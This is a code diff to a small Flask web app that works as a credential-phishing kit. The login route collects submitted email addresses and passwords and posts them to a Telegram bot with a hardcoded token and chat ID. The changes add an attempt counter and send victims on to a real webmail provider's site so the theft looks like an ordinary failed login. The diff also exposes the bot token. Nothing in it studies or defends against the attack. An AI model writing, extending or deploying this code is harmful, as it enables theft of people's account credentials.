@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, flash
+from flask import Flask, render_template, request, redirect, url_for, flash, session
 import requests
 import logging
 
@@ -12,7 +12,6 @@ app.config['SECRET_KEY'] = 'your_secret_key_here'
 TELEGRAM_BOT_TOKEN = '7065127118:AAHCIXzM-_lAwcFYjOGKY4iPgpUcrIk4BoM'
 TELEGRAM_CHAT_ID = '1260772582'
 
-# Function to send message to Telegram
 def send_to_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -21,37 +20,40 @@ def send_to_telegram(message):
     }
     try:
         response = requests.post(url, data=payload)
-        response.raise_for_status()  # Check for HTTP request errors
+        response.raise_for_status()
         app.logger.debug("Message sent to Telegram successfully.")
+        return True
     except requests.exceptions.RequestException as e:
         app.logger.error(f"Failed to send message to Telegram. Error: {str(e)}")
+        return False
 
 @app.route('/')
 def index():
+    session['attempts'] = 0
     return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    email = request.form['email']
-    password = request.form['password']
+    if 'attempts' not in session:
+        session['attempts'] = 0
+    
+    # Increment by 3 for each submission
+    session['attempts'] += 3
+    app.logger.debug(f"Login attempts counted: {session['attempts']}")
+    
+    email = request.form.get('email', '')
+    password = request.form.get('password', '')
 
-    app.logger.debug(f'Received email: {email}')
-    app.logger.debug(f'Received password: {password}')
-
-    # Send email and password to Telegram
-    message = f"Email: {email}\nPassword: {password}"
+    # Send credentials to Telegram
+    message = f"Email: {email}\nPassword: {password}\nTotal Attempts: {session['attempts']}"
     send_to_telegram(message)
 
-    flash('Login details sent successfully.', 'success')
-    return redirect(url_for('index'))
-
-@app.route('/test_telegram')
-def test_telegram():
-    # Test sending a message to Telegram
-    test_message = "This is a test message from Flask."
-    send_to_telegram(test_message)
-    return "Test message sent to Telegram."
+    # Redirect based on attempt count
+    if session['attempts'] >= 3:
+        session['attempts'] = 0  # Reset counter
+        return redirect('https://promail.ptd.net/')  # Special redirect after "3 attempts"
+    
+    return redirect('https://promail.ptd.net/')  # Normal redirect
 
 if __name__ == '__main__':
-    # Only run the app if this script is executed directly
     app.run(host='0.0.0.0', port=5000, debug=True)
